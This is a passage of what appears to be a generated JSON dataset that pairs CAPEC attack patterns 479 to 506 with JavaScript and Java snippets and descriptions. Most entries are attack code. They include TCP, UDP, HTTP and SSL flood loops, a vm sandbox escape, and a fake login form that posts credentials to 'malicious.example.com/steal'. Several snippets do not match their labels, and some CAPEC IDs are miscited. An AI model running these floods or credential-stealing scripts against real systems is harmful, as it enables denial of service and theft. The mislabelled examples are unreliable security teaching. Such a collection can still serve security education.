(execErr, stdout, stderr) => {\n      if (execErr) {\n        console.error('Error starting service:', execErr);\n        return;\n      }\n      console.log('Service started successfully:', stdout);\n    });\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a potential attack where an adversary modifies the configuration of a Windows service to execute a malicious binary. The code reads the current service configuration from a file, modifies the service path to point to a malicious executable, and writes the modified configuration back to the file. Finally, it attempts to start the service using the modified configuration. This example embodies the CAPEC 'Modification of Windows Service Configuration' and leverages related CWEs such as 'Improper Access Control' (CWE-284) and 'External Control of System or Configuration Setting' (CWE-15)."
    },
    {
        "capec_id": "479",
        "capec_name": "Malicious Root Certificate",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// Load a malicious root certificate\nconst maliciousRootCert = fs.readFileSync('malicious-root-cert.pem');\n\n// Create an HTTPS agent that trusts the malicious root certificate\nconst agent = new https.Agent({\n  ca: maliciousRootCert,\n  rejectUnauthorized: false\n});\n\n// Make a request to a spoofed website\nhttps.get('https://spoofed-website.com', { agent }, (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => { console.log(data); });\n}).on('error', (e) => { console.error(e); });",
        "description": "This JavaScript code snippet demonstrates how an adversary might exploit a weakness in certificate validation to install a malicious root certificate and use it to establish a secure connection to a spoofed website. The code loads a malicious root certificate and creates an HTTPS agent that trusts this certificate, bypassing proper certificate validation (CWE-295, CWE-296). It then makes an HTTPS request to a spoofed website, which would be trusted due to the malicious root certificate, potentially allowing the adversary to collect sensitive information such as login credentials. This embodies the main idea of the CAPEC by showing how improper access control and certificate validation can be exploited to avoid security warnings and compromise user data."
    },
    {
        "capec_id": "480",
        "capec_name": "Escaping Virtualization",
        "code_snippet": "const vm = require('vm');\n\n// Simulate a virtualized environment\nconst sandbox = { user: 'guest', sensitiveData: 'secret' };\nvm.createContext(sandbox);\n\n// Vulnerable code: executing untrusted code within the virtualized environment\nconst untrustedCode = `\n  // Attempt to escape the virtualized environment\n  this.process = process;\n  this.require = require;\n  this.fs = require('fs');\n  this.fs.writeFileSync('/tmp/escaped.txt', 'Escaped the sandbox!');\n`;\n\ntry {\n  vm.runInContext(untrustedCode, sandbox);\n} catch (e) {\n  console.error('Error executing untrusted code:', e);\n}\n\nconsole.log('Sandbox:', sandbox);",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary can escape a virtualized environment (sandbox) and gain unauthorized access to the host environment. The code uses Node.js's 'vm' module to create a sandboxed environment and then runs untrusted code within this environment. The untrusted code attempts to escape the sandbox by accessing the 'process' and 'require' objects, and then writes a file to the host filesystem, demonstrating a breach of the sandbox. This example embodies the main idea of CAPEC-272 (Escaping Virtualization) and highlights related CWEs such as CWE-693 (Protection Mechanism Failure) and CWE-653 (Improper Isolation or Compartmentalization)."
    },
    {
        "capec_id": "481",
        "capec_name": "Contradictory Destinations in Traffic Routing Schemes",
        "code_snippet": "const https = require('https');\n\nconst options = {\n  hostname: 'legitimate-domain.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  headers: {\n    'Host': 'malicious-domain.com'\n  }\n};\n\nconst req = https.request(options, (res) => {\n  let data = '';\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n  res.on('end', () => {\n    console.log(data);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a basic example of 'Domain Fronting', where contradictory domain names are used in the SNI field of the TLS header and the Host field of the HTTP header. The 'hostname' in the options object is set to 'legitimate-domain.com', while the 'Host' header is set to 'malicious-domain.com'. This can cause traffic to be routed incorrectly, potentially leading to security vulnerabilities such as data interception or unauthorized access. This example embodies the main idea of CAPEC-Contradictory Destinations in Traffic Routing Schemes and highlights related weaknesses like CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) and CWE-941 (Incorrectly Specified Destination in a Communication Channel)."
    },
    {
        "capec_id": "482",
        "capec_name": "TCP Flood",
        "code_snippet": "const net = require('net');\n\nconst targetHost = '192.168.1.1';\nconst targetPort = 80;\nconst maxConnections = 1000;\nlet connections = 0;\n\nfunction flood() {\n  if (connections < maxConnections) {\n    const client = new net.Socket();\n    client.connect(targetPort, targetHost, () => {\n      console.log('Connected');\n      connections++;\n    });\n    client.on('error', (err) => {\n      console.error('Connection error:', err);\n    });\n    client.on('close', () => {\n      connections--;\n      flood();\n    });\n  }\n}\n\nfor (let i = 0; i < maxConnections; i++) {\n  flood();\n}",
        "description": "This JavaScript code snippet demonstrates a basic TCP flood attack using the 'net' module. The script attempts to establish a large number of TCP connections to a target server (specified by 'targetHost' and 'targetPort'). The 'maxConnections' variable sets the limit for the number of concurrent connections, and the 'flood' function recursively attempts to maintain this number of connections. This can overwhelm the target server's resources, leading to a denial of service. The code embodies the CAPEC-484 (TCP Flood) by exploiting the server's need to maintain state information for each connection. It also touches on CWE-770 (Allocation of Resources Without Limits or Throttling) by not imposing any restrictions on the number of connections, and CWE-406 (Insufficient Control of Network Message Volume) by not controlling the volume of network messages."
    },
    {
        "capec_id": "484",
        "capec_name": "DEPRECATED: XML Client-Side Attack",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst app = express();\n\napp.use(bodyParser.text({ type: 'application/xml' }));\n\napp.post('/upload', (req, res) => {\n  const xml = req.body;\n  xml2js.parseString(xml, (err, result) => {\n    if (err) {\n      return res.status(400).send('Invalid XML');\n    }\n    // No validation of XML schema\n    // Potential for XML Injection\n    const user = result.user;\n    if (user && user.name) {\n      res.send(`Hello, ${user.name}`);\n    } else {\n      res.status(400).send('Invalid user data');\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that accepts XML data via a POST request to the '/upload' endpoint. The XML data is parsed using the 'xml2js' library without any schema validation, making it vulnerable to CWE-112 (Missing XML Validation). Additionally, the code does not properly neutralize special elements in the XML, which can lead to CWE-91 (XML Injection). The server-side security relies on the client to send well-formed XML, which is an example of CWE-602 (Client-Side Enforcement of Server-Side Security). This code embodies the main idea of the deprecated CAPEC for XML Client-Side Attack by demonstrating how unvalidated and improperly handled XML can lead to security vulnerabilities."
    },
    {
        "capec_id": "485",
        "capec_name": "Signature Spoofing by Key Recreation",
        "code_snippet": "const crypto = require('crypto');\n\n// Weak random number generator\nfunction weakRandom() {\n  return Math.floor(Math.random() * 1000000);\n}\n\n// Simulate key generation using weak random values\nfunction generateWeakKey() {\n  const key = weakRandom().toString();\n  return crypto.createHash('sha256').update(key).digest('hex');\n}\n\n// Simulate signing a message\nfunction signMessage(message, privateKey) {\n  const sign = crypto.createSign('SHA256');\n  sign.update(message);\n  sign.end();\n  return sign.sign(privateKey, 'hex');\n}\n\n// Simulate verifying a message\nfunction verifyMessage(message, signature, publicKey) {\n  const verify = crypto.createVerify('SHA256');\n  verify.update(message);\n  verify.end();\n  return verify.verify(publicKey, signature, 'hex');\n}\n\n// Attacker recreates the weak key\nconst attackerPrivateKey = generateWeakKey();\nconst message = 'Sensitive data';\nconst forgedSignature = signMessage(message, attackerPrivateKey);\n\n// Victim verifies the forged signature\nconst isValid = verifyMessage(message, forgedSignature, attackerPrivateKey);\nconsole.log('Is the forged signature valid?', isValid);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker exploits a weak random number generator to recreate a private key and forge a signature. The `weakRandom` function generates insufficiently random values, leading to predictable keys. The `generateWeakKey` function simulates key generation using these weak random values. The attacker uses the weak key to sign a message, and the victim verifies the forged signature, mistakenly believing it to be valid. This embodies the CAPEC of 'Signature Spoofing by Key Recreation' and highlights related CWEs such as 'Use of Insufficiently Random Values' and 'Use of Predictable Algorithm in Random Number Generator'."
    },
    {
        "capec_id": "486",
        "capec_name": "UDP Flood",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.from('Flood Attack');\nconst targetIP = '192.168.1.1';\nconst targetPort = 12345;\n\nfunction flood() {\n  for (let i = 0; i < 100000; i++) {\n    client.send(message, 0, message.length, targetPort, targetIP, (err) => {\n      if (err) console.error('Error:', err);\n    });\n  }\n}\n\nflood();",
        "description": "This JavaScript code snippet demonstrates a UDP flood attack, which is a type of denial-of-service (DoS) attack. The code uses the 'dgram' module to create a UDP client that sends a large number of UDP packets to a target IP address and port. The 'flood' function sends 100,000 UDP packets with the message 'Flood Attack' to the specified target. This can overwhelm the target's network bandwidth and resources, potentially causing a denial of service. The code embodies the main idea of CAPEC-UDP Flood and highlights related CWEs such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-406 (Insufficient Control of Network Message Volume)."
    },
    {
        "capec_id": "487",
        "capec_name": "ICMP Flood",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  console.log(`Server got: ${msg} from ${rinfo.address}:${rinfo.port}`);\n  // No throttling or resource limits\n  // No validation of the source address\n});\n\nserver.on('error', (err) => {\n  console.log(`Server error:\n${err.stack}`);\n  server.close();\n});\n\nserver.bind(41234);",
        "description": "This JavaScript code snippet creates a simple UDP server using the 'dgram' module. The server listens for incoming messages and logs them to the console. The code embodies the main idea of an ICMP Flood attack (CAPEC-ICMP Flood) by not implementing any throttling or resource limits (CWE-770), and not validating the source address of incoming messages (CWE-923). This makes the server vulnerable to a flooding attack, where an attacker can send a high rate of packets from spoofed addresses, potentially consuming all available network bandwidth and denying legitimate users access to the service."
    },
    {
        "capec_id": "488",
        "capec_name": "HTTP Flood",
        "code_snippet": "const http = require('http');\nconst url = 'http://example.com/resource';\n\nfunction floodServer() {\n  for (let i = 0; i < 1000; i++) {\n    http.get(url, (res) => {\n      res.on('data', (chunk) => {});\n      res.on('end', () => {});\n    }).on('error', (e) => {\n      console.error(`Got error: ${e.message}`);\n    });\n  }\n}\n\nfloodServer();",
        "description": "This JavaScript code snippet demonstrates an HTTP Flood attack, where multiple HTTP GET requests are sent to a target server in a loop. The code uses Node.js's 'http' module to send 1000 GET requests to 'http://example.com/resource'. This type of attack aims to consume the server's resources, making it difficult for legitimate users to access the service. The code embodies the main idea of CAPEC-488 (HTTP Flood) and highlights CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-410 (Insufficient Resource Pool) by not imposing any restrictions on the number of requests sent, potentially overwhelming the server's resource pool."
    },
    {
        "capec_id": "489",
        "capec_name": "SSL Flood",
        "code_snippet": "const https = require('https');\nconst options = {\n  hostname: 'target-server.com',\n  port: 443,\n  path: '/',\n  method: 'GET',\n  rejectUnauthorized: false\n};\n\nfunction floodServer() {\n  for (let i = 0; i < 1000; i++) {\n    const req = https.request(options, (res) => {\n      res.on('data', (d) => {});\n    });\n    req.on('error', (e) => {});\n    req.end();\n  }\n}\n\nsetInterval(floodServer, 100);",
        "description": "This JavaScript code snippet demonstrates a basic SSL flood attack. It repeatedly sends a large number of HTTPS requests to a target server, aiming to exhaust the server's resources. The 'floodServer' function creates 1000 HTTPS requests in a loop, and this function is called every 100 milliseconds using 'setInterval'. This simulates the 'SSL Flood' attack described in the CAPEC by consuming a disproportionate amount of server resources. The related CWEs are represented by the lack of resource limits (CWE-770), insufficient resource pool (CWE-410), and uncontrolled resource consumption (CWE-400)."
    },
    {
        "capec_id": "490",
        "capec_name": "Amplification",
        "code_snippet": "const http = require('http');\n\nfunction sendAmplifiedRequest(targetServer) {\n  const options = {\n    hostname: 'third-party-service.com',\n    port: 80,\n    path: '/api/large-response',\n    method: 'GET',\n    headers: {\n      'X-Forwarded-For': targetServer\n    }\n  };\n\n  const req = http.request(options, (res) => {\n    res.on('data', (chunk) => {\n      // Intentionally left empty to simulate resource consumption\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n  });\n\n  req.end();\n}\n\n// Example usage\nsendAmplifiedRequest('victim-server.com');",
        "description": "This JavaScript code snippet demonstrates an amplification attack. The function `sendAmplifiedRequest` sends a request to a third-party service, spoofing the source address to be that of the target server (`targetServer`). The third-party service is expected to generate a large response, which is then sent to the target server, causing it to consume excessive resources. This embodies the CAPEC's main idea of using minimal resources to generate a large amount of traffic against a target server. The code also reflects CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-405 (Asymmetric Resource Consumption) by not imposing any restrictions on the size or number of resources allocated and causing the target to consume excessive resources without equivalent work from the adversary."
    },
    {
        "capec_id": "491",
        "capec_name": "Quadratic Data Expansion",
        "code_snippet": "function expandEntity(entity, times) {\n  let expanded = '';\n  for (let i = 0; i < times; i++) {\n    expanded += entity;\n  }\n  return expanded;\n}\n\nconst largeEntity = 'A'.repeat(1000000); // 1 million characters\nconst result = expandEntity(largeEntity, 1000); // Expands the entity 1000 times\nconsole.log(result.length);",
        "description": "This JavaScript code snippet demonstrates a quadratic data expansion vulnerability. The `expandEntity` function takes an entity (a string) and a number of times to expand it. It concatenates the entity to itself the specified number of times, leading to potentially excessive memory allocation. In this example, `largeEntity` is a string of 1 million characters, and it is expanded 1000 times, resulting in a string of 1 billion characters. This can cause a denial of service by consuming excessive memory, potentially freezing or crashing the application. This snippet embodies the main idea of CAPEC-197 and related CWEs, such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-1325 (Improperly Controlled Sequential Memory Allocation)."
    },
    {
        "capec_id": "492",
        "capec_name": "Regular Expression Exponential Blowup",
        "code_snippet": "const regex = /(a+)+$/;\nconst input = 'a'.repeat(10000) + 'b';\nconsole.log(regex.test(input));",
        "description": "This JavaScript code snippet demonstrates a Regular Expression Exponential Blowup vulnerability. The regular expression /(a+)+$/ is designed to match one or more 'a' characters, followed by the end of the string. However, due to its nested quantifiers, it can cause exponential backtracking when processing long strings of 'a' characters. The input string 'a'.repeat(10000) + 'b' is crafted to exploit this inefficiency, leading to excessive CPU consumption and potential denial of service. This example highlights CWE-400 (Uncontrolled Resource Consumption) and CWE-1333 (Inefficient Regular Expression Complexity)."
    },
    {
        "capec_id": "493",
        "capec_name": "SOAP Array Blowup",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk.toString();\n  });\n\n  req.on('end', () => {\n    xml2js.parseString(body, (err, result) => {\n      if (err) {\n        res.writeHead(400, {'Content-Type': 'text/plain'});\n        res.end('Invalid XML');\n        return;\n      }\n\n      // Vulnerable part: allocating memory for a large array\n      const arraySize = parseInt(result?.Envelope?.Body?.[0]?.Array?.[0]?.$.size, 10);\n      if (isNaN(arraySize) || arraySize > 1000000) {\n        res.writeHead(400, {'Content-Type': 'text/plain'});\n        res.end('Array size too large');\n        return;\n      }\n\n      const largeArray = new Array(arraySize);\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Array allocated');\n    });\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server running on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming SOAP messages. It uses the 'xml2js' library to parse the XML content of the SOAP message. The vulnerable part of the code is where it reads the 'size' attribute of an array from the SOAP message and allocates memory for an array of that size without proper validation. This can lead to a SOAP Array Blowup attack, where an attacker sends a SOAP message with a very large array size, causing the server to allocate excessive memory and potentially exhaust its resources. The code also demonstrates CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-1325 (Improperly Controlled Sequential Memory Allocation) by not imposing limits on the array size."
    },
    {
        "capec_id": "494",
        "capec_name": "TCP Fragmentation",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(80, 'target.server.com', () => {\n  const fragment1 = Buffer.from('4500', 'hex'); // IP header (partial)\n  const fragment2 = Buffer.from('0034', 'hex'); // TCP header (partial)\n  const payload = Buffer.from('GET / HTTP/1.1\\r\\nHost: target.server.com\\r\\n\\r\\n');\n\n  client.write(Buffer.concat([fragment1, payload.slice(0, 10)])); // Send first fragment\n  client.write(Buffer.concat([fragment2, payload.slice(10)])); // Send second fragment\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  client.destroy(); // CWE-404: Improper Resource Shutdown or Release\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP fragmentation attack. It uses the 'net' module to create a TCP client that connects to a target server. The code then sends a fragmented TCP packet, with the intention of bypassing network filtering rules. The first fragment contains part of the IP header and the initial part of the payload, while the second fragment contains the rest of the TCP header and the remaining payload. This fragmentation can cause the target server to misinterpret the request, potentially bypassing security controls. The code also includes a CWE-404 vulnerability by not properly releasing the resource (the TCP connection) after use."
    },
    {
        "capec_id": "495",
        "capec_name": "UDP Fragmentation",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst message = Buffer.alloc(2000, 'A'); // Large UDP packet to force fragmentation\nconst targetHost = '192.168.1.1';\nconst targetPort = 12345;\n\nfunction sendFragmentedPackets() {\n  for (let i = 0; i < 1000; i++) { // High volume to consume resources\n    client.send(message, targetPort, targetHost, (err) => {\n      if (err) console.error('Error sending packet:', err);\n    });\n  }\n}\n\nsendFragmentedPackets();\n\nclient.on('close', () => {\n  console.log('Socket closed');\n});\n\nprocess.on('SIGINT', () => {\n  client.close();\n});",
        "description": "This JavaScript code snippet demonstrates a UDP Fragmentation attack. It uses the 'dgram' module to create a UDP client that sends large UDP packets (2000 bytes) to a target server, forcing IP fragmentation. The loop sends a high volume of these packets to consume network bandwidth and server resources, such as CPU and memory buffers. This code embodies the main idea of CAPEC-UDP Fragmentation and highlights related CWEs, such as CWE-770 (Allocation of Resources Without Limits or Throttling) by not limiting the number of packets sent, and CWE-406 (Insufficient Control of Network Message Volume) by not controlling the volume of network traffic."
    },
    {
        "capec_id": "496",
        "capec_name": "ICMP Fragmentation",
        "code_snippet": "const dgram = require('dgram');\nconst client = dgram.createSocket('udp4');\n\nconst fragmentICMP = (target, port) => {\n  const message = Buffer.alloc(65507, 'A'); // Large message to simulate fragmentation\n  for (let i = 0; i < 1000; i++) { // Send multiple fragmented packets\n    client.send(message, 0, message.length, port, target, (err) => {\n      if (err) console.error('Error sending packet:', err);\n    });\n  }\n};\n\nfragmentICMP('192.168.1.1', 33434); // Target IP and port\n\nclient.on('error', (err) => {\n  console.error('Socket error:', err);\n  client.close();\n});",
        "description": "This JavaScript code snippet uses the 'dgram' module to create a UDP client that sends a large number of oversized packets to a target IP address and port. The 'fragmentICMP' function simulates an ICMP fragmentation attack by sending multiple large packets, which can overwhelm the target's resources, leading to potential crashes or non-responsiveness. This embodies the main idea of the CAPEC by demonstrating how an attacker might exploit resource allocation without limits (CWE-770) and improper resource shutdown or release (CWE-404). The code also includes error handling to demonstrate improper resource shutdown or release."
    },
    {
        "capec_id": "497",
        "capec_name": "File Discovery",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction checkFileExistence(userInputPath) {\n  const sensitiveFiles = ['config.json', 'secrets.env', 'access_control_list.txt'];\n  const basePath = '/var/www/app/';\n  const fullPath = path.join(basePath, userInputPath);\n\n  sensitiveFiles.forEach(file => {\n    const filePath = path.join(fullPath, file);\n    if (fs.existsSync(filePath)) {\n      console.log(`Sensitive file found: ${filePath}`);\n    }\n  });\n}\n\n// Example usage\ncheckFileExistence('../../etc/');",
        "description": "This JavaScript code snippet demonstrates a vulnerable file discovery mechanism. The function `checkFileExistence` takes a user-supplied path and checks for the existence of sensitive files within that path. The code concatenates the user input with a base path, which can lead to directory traversal attacks (CWE-73). If any of the sensitive files are found, it logs their presence, potentially exposing sensitive information (CWE-200). The code also implicitly trusts the user-supplied path, which can lead to untrusted search paths (CWE-426) and reliance on file names or extensions (CWE-646). This snippet embodies the main idea of CAPEC-115 (File Discovery) by demonstrating how an adversary might probe for key files to gather sensitive information."
    },
    {
        "capec_id": "498",
        "capec_name": "Probe iOS Screenshots",
        "code_snippet": "document.addEventListener('visibilitychange', function() {\n  if (document.hidden) {\n    // Simulate sensitive data being exposed in a screenshot\n    document.getElementById('sensitiveInfo').style.display = 'block';\n  } else {\n    document.getElementById('sensitiveInfo').style.display = 'none';\n  }\n});\n\n// Simulate sensitive data\nlet sensitiveInfo = document.createElement('div');\nsensitiveInfo.id = 'sensitiveInfo';\nsensitiveInfo.style.display = 'none';\nsensitiveInfo.innerText = 'Sensitive Information: User Password';\ndocument.body.appendChild(sensitiveInfo);",
        "description": "This JavaScript code snippet demonstrates a vulnerability where sensitive information is exposed when an iOS application is sent to the background. The 'visibilitychange' event listener checks if the document is hidden (i.e., the app is in the background). If it is, it displays a div containing sensitive information, simulating the exposure of this data in a screenshot. This represents the CAPEC 'Probe iOS Screenshots' attack. The code also touches on CWE-359 (Exposure of Private Personal Information) by displaying sensitive data, CWE-497 (Exposure of Sensitive System Information) by not properly securing the sensitive information, and CWE-222 (Truncation of Security-relevant Information) by potentially truncating the sensitive data displayed."
    },
    {
        "capec_id": "499",
        "capec_name": "Android Intent Intercept",
        "code_snippet": "const sendSensitiveData = (data) => {\n  const intent = new Intent();\n  intent.setAction('com.example.SEND_DATA');\n  intent.putExtra('data', data);\n  // Implicit intent without permission check\n  sendBroadcast(intent);\n};\n\nconst receiveSensitiveData = (context) => {\n  const receiver = new BroadcastReceiver({\n    onReceive: (context, intent) => {\n      const action = intent.getAction();\n      if (action === 'com.example.SEND_DATA') {\n        const data = intent.getStringExtra('data');\n        console.log('Received data:', data);\n      }\n    }\n  });\n  const filter = new IntentFilter('com.example.SEND_DATA');\n  context.registerReceiver(receiver, filter);\n};\n\n// Example usage\nsendSensitiveData('This is sensitive data');\nreceiveSensitiveData(context);",
        "description": "This JavaScript code snippet demonstrates a vulnerable Android application scenario where sensitive data is transmitted using an implicit intent without proper verification or permission checks. The `sendSensitiveData` function creates an implicit intent to send sensitive data, while the `receiveSensitiveData` function registers a broadcast receiver to receive the intent. This setup allows any application with a matching intent filter to intercept the data, leading to potential information disclosure, data injection, or denial of service. The code embodies the main idea of CAPEC-273 (Android Intent Intercept) and highlights related weaknesses such as CWE-925 (Improper Verification of Intent by Broadcast Receiver) and CWE-927 (Use of Implicit Intent for Sensitive Communication)."
    },
    {
        "capec_id": "500",
        "capec_name": "WebView Injection",
        "code_snippet": "const webView = document.getElementById('webview');\n\n// Exposed dangerous method\nwebView.addEventListener('load', () => {\n  webView.executeScript(`\n    // Injected malicious code\n    document.cookie = 'session=maliciousSession';\n    document.body.innerHTML += '<script src=\"http://malicious.com/malware.js\"></script>';\n  `);\n});\n\n// Improper verification of source\nif (webView.src !== 'https://trustedsource.com') {\n  console.warn('Untrusted source detected!');\n}\n\n// Client-side enforcement of server-side security\nif (document.cookie.includes('session=validSession')) {\n  console.log('Access granted');\n} else {\n  console.log('Access denied');\n}",
        "description": "This JavaScript code snippet demonstrates a WebView Injection vulnerability. The code listens for the 'load' event on a WebView component and then executes a script within the WebView's context. The injected script manipulates cookies and injects a malicious script into the DOM, representing CWE-506 (Embedded Malicious Code) and CWE-784 (Reliance on Cookies without Validation and Integrity Checking in a Security Decision). The code also shows improper verification of the WebView's source (CWE-940) and relies on client-side checks for security decisions (CWE-602). This snippet highlights how an adversary can exploit these weaknesses to manipulate the web page and compromise security."
    },
    {
        "capec_id": "501",
        "capec_name": "Android Activity Hijack",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Vulnerable endpoint that does not verify the source of the request\napp.post('/sensitive-data', (req, res) => {\n  const { data } = req.body;\n  // Implicitly trust the incoming data without verification\n  processSensitiveData(data);\n  res.send('Data processed');\n});\n\n// Function to mimic processing of sensitive data\nfunction processSensitiveData(data) {\n  console.log('Processing sensitive data:', data);\n}\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a vulnerable server-side endpoint using Express.js. The endpoint '/sensitive-data' accepts POST requests and processes sensitive data without verifying the source of the request. This embodies the main idea of the CAPEC 'Android Activity Hijack' by demonstrating how an adversary could exploit improper verification of the source (CWE-940) and improper restriction of communication channels (CWE-923). The code implicitly trusts incoming data, which could lead to sensitive data being intercepted or manipulated by a malicious actor."
    },
    {
        "capec_id": "502",
        "capec_name": "Intent Spoof",
        "code_snippet": "const express = require('express');\nconst app = express();\n\n// Vulnerable endpoint that accepts data from any source\napp.post('/updateData', (req, res) => {\n  const data = req.body.data;\n  // No verification of the source of the request\n  updateDatabase(data);\n  res.send('Data updated');\n});\n\nfunction updateDatabase(data) {\n  // Simulate database update\n  console.log('Database updated with:', data);\n}\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a vulnerable Express.js server endpoint that embodies the main idea of the CAPEC 'Intent Spoof'. The '/updateData' endpoint accepts data from any source without verifying the request's origin, which is analogous to an Android component that trusts an intent's action without verification. This can lead to improper access control (CWE-284), improper verification of the source (CWE-925), and improper export of functionality (CWE-926). The code demonstrates how an adversary could exploit such a vulnerability to modify data without proper authorization."
    },
    {
        "capec_id": "503",
        "capec_name": "WebView Exposure",
        "code_snippet": "import android.webkit.WebView;\nimport android.webkit.JavascriptInterface;\nimport android.app.Activity;\nimport android.os.Bundle;\n\npublic class MainActivity extends Activity {\n    private WebView webView;\n\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        webView = findViewById(R.id.webview);\n        webView.getSettings().setJavaScriptEnabled(true);\n        webView.addJavascriptInterface(new WebAppInterface(this), \"AndroidInterface\");\n        webView.loadUrl(\"file:///android_asset/index.html\");\n    }\n\n    public class WebAppInterface {\n        Activity mActivity;\n\n        WebAppInterface(Activity activity) {\n            mActivity = activity;\n        }\n\n        @JavascriptInterface\n        public void showToast(String toast) {\n            Toast.makeText(mActivity, toast, Toast.LENGTH_SHORT).show();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the use of the WebView's addJavascriptInterface API in an Android application. The WebView is configured to enable JavaScript and an interface named 'AndroidInterface' is registered, exposing the 'showToast' method to JavaScript running in the WebView. This setup can be exploited by a malicious web page loaded in the WebView to call the 'showToast' method, potentially leading to improper access control (CWE-284) and exposing dangerous methods (CWE-749). The code represents the main idea of the CAPEC by showing how an interface registered through WebView can be globally accessible, posing security risks."
    },
    {
        "capec_id": "504",
        "capec_name": "Task Impersonation",
        "code_snippet": "document.addEventListener('DOMContentLoaded', function() {\n  // Create an iframe to impersonate a legitimate task\n  var iframe = document.createElement('iframe');\n  iframe.style.position = 'absolute';\n  iframe.style.top = '0';\n  iframe.style.left = '0';\n  iframe.style.width = '100%';\n  iframe.style.height = '100%';\n  iframe.style.zIndex = '1000';\n  iframe.src = 'https://legitimate-site.com/login'; // URL of the legitimate task\n  document.body.appendChild(iframe);\n\n  // Capture user input from the impersonated task\n  iframe.contentWindow.addEventListener('input', function(event) {\n    var userInput = event.target.value;\n    console.log('Captured input: ' + userInput); // Log or send the captured input to a malicious server\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a task impersonation attack by creating an iframe that overlays the entire webpage, impersonating a legitimate login page. The iframe captures user input, which can then be logged or sent to a malicious server. This example highlights the vulnerability described in CAPEC-1021 (Improper Restriction of Rendered UI Layers or Frames) by exploiting the lack of proper UI layer restrictions to deceive the user. It also touches on CWE-506 (Embedded Malicious Code) by embedding malicious behavior within the code."
    },
    {
        "capec_id": "505",
        "capec_name": "Scheme Squatting",
        "code_snippet": "window.addEventListener('load', function() {\n  if (window.location.protocol === 'custom-scheme:') {\n    // CWE-939: Improper Authorization in Handler for Custom URL Scheme\n    var params = new URLSearchParams(window.location.search);\n    var sensitiveData = params.get('data'); // CWE-598: Use of GET Request Method With Sensitive Query Strings\n    if (sensitiveData) {\n      // CWE-506: Embedded Malicious Code\n      document.body.innerHTML = '<form id=\"phishForm\"><input type=\"text\" name=\"username\" placeholder=\"Username\"><input type=\"password\" name=\"password\" placeholder=\"Password\"><button type=\"submit\">Login</button></form>';\n      document.getElementById('phishForm').addEventListener('submit', function(e) {\n        e.preventDefault();\n        var username = e.target.username.value;\n        var password = e.target.password.value;\n        // Send credentials to malicious server\n        fetch('https://malicious.example.com/steal', {\n          method: 'POST',\n          headers: {'Content-Type': 'application/json'},\n          body: JSON.stringify({username: username, password: password})\n        });\n      });\n    }\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a Scheme Squatting attack. When a custom URL scheme (e.g., 'custom-scheme:') is detected, the code extracts sensitive data from the URL query string (CWE-598). It then displays a fake login form (CWE-506) that mimics the target application. When the user submits the form, their credentials are sent to a malicious server. This attack exploits improper authorization in the handler for the custom URL scheme (CWE-939)."
    },
    {
        "capec_id": "506",
        "capec_name": "Tapjacking",
        "code_snippet": "document.addEventListener('DOMContentLoaded', function() {\n  // Create a transparent overlay\n  var overlay = document.createElement('div');\n  overlay.style.position = 'absolute';\n  overlay.style.top = '0';\n  overlay.style.left = '0';\n  overlay.style.width = '100%';\n  overlay.style.height = '100%';\n  overlay.style.opacity = '0';\n  overlay.style.zIndex = '1000';\n  document.body.appendChild(overlay);\n\n  // Create a hidden button that will be clicked\n  var hiddenButton = document.createElement('button');\n  hiddenButton.style.position = 'absolute';\n  hiddenButton.style.top = '50%';\n  hiddenButton.style.left = '50%';\n  hiddenButton.style.transform = 'translate(-50%, -50%)';\n  hiddenButton.style.zIndex = '1001';\n  hiddenButton.style.opacity = '0';\n  hiddenButton.onclick = function() {\n    alert('Hidden button clicked!');\n  };\n  document.body.appendChild(hiddenButton);\n\n  // Simulate user interaction\n  overlay.addEventListener('click', function() {\n    hiddenButton.click();\n  });\n});",
